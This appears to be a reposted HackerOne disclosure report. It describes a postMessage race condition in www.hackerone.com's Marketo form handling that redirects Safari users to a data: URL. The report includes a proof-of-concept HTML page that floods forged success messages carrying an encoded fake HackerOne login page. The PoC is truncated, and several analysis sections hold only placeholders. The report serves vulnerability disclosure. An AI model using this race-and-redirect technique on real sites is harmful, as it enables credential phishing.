# Client-Side Race Condition using Marketo, allows sending user to data-protocol in Safari when form without onSuccess is submitted on www.hackerone.com

## Metadata
- **Source:** HackerOne
- **Report:** 381356 | https://hackerone.com/reports/381356
- **Submitted:** 2018-07-13
- **Reporter:** fransrosen
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Business Logic Errors
- **CVEs:** None
- **Category:** business-logic

## Summary
Hi,

I made a talk earlier this month about Client-Side Race Conditions for postMessage on AppSecEU:

https://speakerdeck.com/fransrosen/owasp-appseceu-2018-attacking-modern-web-technologies

In this talk I mention some fun ways to race postMessages from a malicious origin before the legit source sends it.

### Background

As you remember from #207042 you use Marketo for your form-submissions on `

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi,

I made a talk earlier this month about Client-Side Race Conditions for postMessage on AppSecEU:

https://speakerdeck.com/fransrosen/owasp-appseceu-2018-attacking-modern-web-technologies

In this talk I mention some fun ways to race postMessages from a malicious origin before the legit source sends it.

### Background

As you remember from #207042 you use Marketo for your form-submissions on `www.hackerone.com`.

Now, back then, I abused the fact that no origin was checked on the receiving end of marketo.com. By doing this I was then able to steal the data being submitted.

### Technical Description

In this case however, I noticed that as soon as you submit a form, one of the listener being on `www.hackerone.com` will pass the content forward to a handler for the specific form that was loaded.

As soon as it finds the form that was initiated and submitted, it will either run the `error` or `success`-function based on the content of the postMessage. If the message is a success, it will run any `form.onSuccess` being defined when the form was loaded. You can see some of these in this file:   

https://www.hackerone.com/sites/default/files/js/js_pdV-E7sfuhFWSyRH44H1WwxQ_J7NeE2bU6XNDJ8w1ak.js

```js
      form.onSuccess(function() {
        return false;
      }); 
```

If the `onSuccess` returns `false` nothing more will happen. However, if the `onSuccess` doesn't exist or returns `true`, the parameter called `followUpUrl` will instead be sent to `location.href`.

There is no check whatsoever what this URL contains. The code does parse the URL and if a parameter called `aliId` is set it will append it to the URL.

As you might now, the flow of the Marketo-solution looks like this:

1. Form is initiated by loading a JS-file from Marketo.
2. Form shows up on www.hackerone.com
3. Form is submitted. Listener is now initiated on www.hackerone.com
4. Message is sent to Marketo from www.hackerone.com using postMessage
5. Marketo gets the message and runs an ajax call to save it on Marketo
6. When successful, a postMessage is sent from Marketo back to www.hackerone.com with the status. The listener catches the response and checks `onSuccess`.
7. If onSuccess gives false, don't do anything. If it doesn't exists or returns `true`, follow the `followUpUrl`.

### Exploitation

Since no origin check is made on the listener initated in #3, we can from our end try to race the message between #3 and #6. If our message comes through we can direct the user to whatever location we like if we find a form that doesn't utilize `onSuccess`.

#### Forms on www.hackerone.com

Looking at the forms, we can see that one being initiated called `mktoForm_1013` does not have any `onSuccess`-function on it. This means that we can now use the `followUpUrl` from the postMessage to send the user to our location. We can also see in the URL of your JS-code above that the following URLs contains `mktoForm_1013`:

```js
      if (location.pathname == "/product/response") {
        $('#mktoForm_1013 .mktoHtmlText p').text('Want to get up and running with HackerOne Response? Give us a few details and we’ll be in touch shortly!');
      }
      else if (location.pathname == "/product/bounty") {
        $('#mktoForm_1013 .mktoHtmlText p').text('Want to tap into the ultimate level of hacker-powered security with HackerOne Bounty? Give us a few details and we’ll be in touch shortly!');
      }
      else if (location.pathname == "/product/challenge") {
        $('#mktoForm_1013 .mktoHtmlText p').text('Up for a HackerOne Challenge? Want to learn more? Give us a few details and we’ll be in touch shortly!');
      }
      else if (location.pathname == "/services") {
        $('#mktoForm_1013 .mktoHtmlText p').text("We're looking forward to serving you. Give us a few details and we’ll be in touch shortly!");
      }
      else if (location.pathname == "/") {
        $('#mktoForm_1013 .mktoHtmlText p').text("Start uncovering critical vulnerabilities today. Give us a few details and we’ll be in touch shortly!");
      }
```

And as before in the old report, we know that `#contact` as the fragment will open the form directly without interaction.

#### CSP

Due to your CSP, we cannot send the user to `javascript:`. If your CSP would have allowed it, we would have a proper XSS on www.hackerone.com. Chrome and Firefox also disallows sending the user to a `data:`-URL. We can send the user to any location we like, but that's no fun.

...but...

...enter Safari.

Safari does not restrict top-navigation to `data:` (tested in macOS 10.13.5, Safari 11.1.1). This means that we can do the following:

1. Have a malicious page opening `https://www.hackerone.com/product/response#contact`
2. Make it send a bunch of messages saying the form as successfully submitted.
3. When the victim fills in the form and submits, our message will hopefully win, since Marketo needs to both get the postMessage and send an ajax call to save the response until it sends a legit response. 
4. We redirect the user to a very good-looking sign-in page for HackerOne.
5. ??? 
6. PROFIT!!!



### PoC

When trying this attack I noticed that if Safari opens www.hackerone.com in a new tab instead of a new window, Safari counts the tab as inactive and will slow down the sending of postMessages to the current frame. However, if you open www.hackerone.com in a complete new window, using `window.open(url,'','_blank')`, Safari will not count the old window as inactive and the messages will be sent just as fast which will significantly increase our chance of winning the race.

The following HTML should show you my PoC in Safari:

```html
<html>
<head>
<script>
var b;
function doit() {
	setInterval(function() {
		b.postMessage('{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"data:text/html;base64,PGhlYWQ+PGxpbmsgcmVsPXN0eWxlc2hlZXQgbWVkaWE9YWxsIGhyZWY9aHR0cHM6Ly9oYWNrZXJvbmUuY29tL2Fzc2V0cy9mcm9udGVuZC4wMjAwMjhlOTU1YTg5Zjg1YTVmYzUyMWVhYzMxMDM2OC5jc3MgLz48bGluayByZWw9c3R5bGVzaGVldCBtZWRpYT1hbGwgaHJlZj1odHRwczovL2hhY2tlcm9uZS5jb20vYXNzZXRzL3ZlbmRvci1iZmRlMjkzYTUwOTEzYTA5NWQ4Y2RlOTcwZWE1YzFlNGEzNTI0M2NjNzY3NWI2Mjg2YTJmM2Y3MDI2ZmY1ZTEwLmNzcz48L2hlYWQ+PGJvZHk+PGRpdiBjbGFzcz0iYWxlcnRzIj4KPC9kaXY+PGRpdiBjbGFzcz0ianMtYXBwbGljYXRpb24tcm9vdCBmdWxsLXNpemUiPjxzcGFuIGRhdGEtcmVhY3Ryb290PSIiPjxkaXYgY2xhc3M9ImZ1bGwtc2l6ZSBhcHBsaWNhdGlvbl9mdWxsX3dpZHRoX2xheW91dCI+PGRpdj48ZGl2PjxkaXYgY2xhc3M9InRvcGJhci1zaWduZWQtb3V0Ij48ZGl2IGNsYXNzPSJpbm5lci1jb250YWluZXIiPjxkaXY+PGEgY2xhc3M9ImFwcF9fbG9nbyIgaHJlZj0iLyI+PGltZyBzcmM9Imh0dHBzOi8vaGFja2Vyb25lLmNvbS9hc3NldHMvc3RhdGljL2ludmVydGVkX2xvZ28tYzA0MzBhZjgucG5nIiBhbHQ9IkhhY2tlck9uZSI+PC9hPjxkaXYgY2xhc3M9InRvcGJhci10b2dnbGUiPjxpIGNsYXNzPSJpY29uLWhhbWJ1cmdlciI+PC9pPjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9InRvcGJhci1zdWJuYXYtd3JhcHBlciI+PHVsIGNsYXNzPSJ0b3BiYXItc3VibmF2Ij48bGkgY2xhc3M9InRvcGJhci1zdWJuYXYtaXRlbSI+PGEgY2xhc3M9InRvcGJhci1zdWJuYXYtbGluayIgaHJlZj0iL3VzZXJzL3NpZ25faW4iPlNpZ24gSW48L2E+Jm5ic3A7fCZuYnNwOzwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItc3VibmF2LWl0ZW0iPjxhIGNsYXNzPSJ0b3BiYXItc3VibmF2LWxpbmsiIGhyZWY9Ii91c2Vycy9zaWduX3VwIj5TaWduIFVwPC9hPjwvbGk+PC91bD48L2Rpdj48ZGl2IGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi13cmFwcGVyIj48dWwgY2xhc3M9InRvcGJhci1uYXZpZ2F0aW9uIj48bGkgY2xhc3M9InRvcGJhci1uYXZpZ2F0aW9uLWl0ZW0iPjxzcGFuIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1kZXNrdG9wLWxpbmsiPjxhIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1saW5rIj5Gb3IgQnVzaW5lc3M8L2E+PC9zcGFuPjwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1pdGVtIj48c3BhbiBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tZGVza3RvcC1saW5rIj48YSBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tbGluayI+Rm9yIEhhY2tlcnM8L2E+PC9zcGFuPjwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1pdGVtIj48c3BhbiBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tZGVza3RvcC1saW5rIj48YSBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tbGluayIgaHJlZj0iL2hhY2t0aXZpdHkiPkhhY2t0aXZpdHk8L2E+PC9zcGFuPjwvbGk+PGxpIGNsYXNzPSJ0b3BiYXItbmF2aWdhdGlvbi1pdGVtIj48c3BhbiBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tZGVza3RvcC1saW5rIj48YSBjbGFzcz0idG9wYmFyLW5hdmlnYXRpb24tbGluayI+Q29tcGFueTwvYT48L3N

</details>

---
*Analysed by Claude on 2026-05-24*
